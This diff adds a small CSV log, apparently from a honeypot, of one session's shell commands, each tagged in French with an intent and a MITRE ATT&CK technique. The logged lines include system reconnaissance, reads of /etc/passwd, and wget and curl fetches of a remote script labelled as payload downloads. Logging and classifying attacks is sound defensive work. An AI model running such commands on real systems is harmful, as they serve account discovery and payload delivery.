@@ -1,0 +1,8 @@
+session,src_ip,timestamp,input,intention,technique
+21a832e4f778,172.20.10.2,2026-11-18 12:34:24.335643+00:00,uname -a,Reconnaissance système,T1082
+21a832e4f778,172.20.10.2,2026-11-18 12:34:43.996851+00:00,cat /etc/password,Découverte de comptes,T1087.001
+21a832e4f778,172.20.10.2,2026-11-18 12:34:55.978231+00:00,cat /etc/passwd,Découverte de comptes,T1087.001
+21a832e4f778,172.20.10.2,2026-11-18 12:35:13.077881+00:00,whoami,Découverte utilisateur,T1033
+21a832e4f778,172.20.10.2,2026-11-18 12:35:18.537500+00:00,ps aux,Découverte de processus,T1057
+21a832e4f778,172.20.10.2,2026-11-18 12:35:28.577188+00:00,wget http://example.com/test.sh,Téléchargement de charge,T1105
+21a832e4f778,172.20.10.2,2026-11-18 12:35:43.905153+00:00,curl http://example.com/test.sh,Téléchargement de charge,T1105
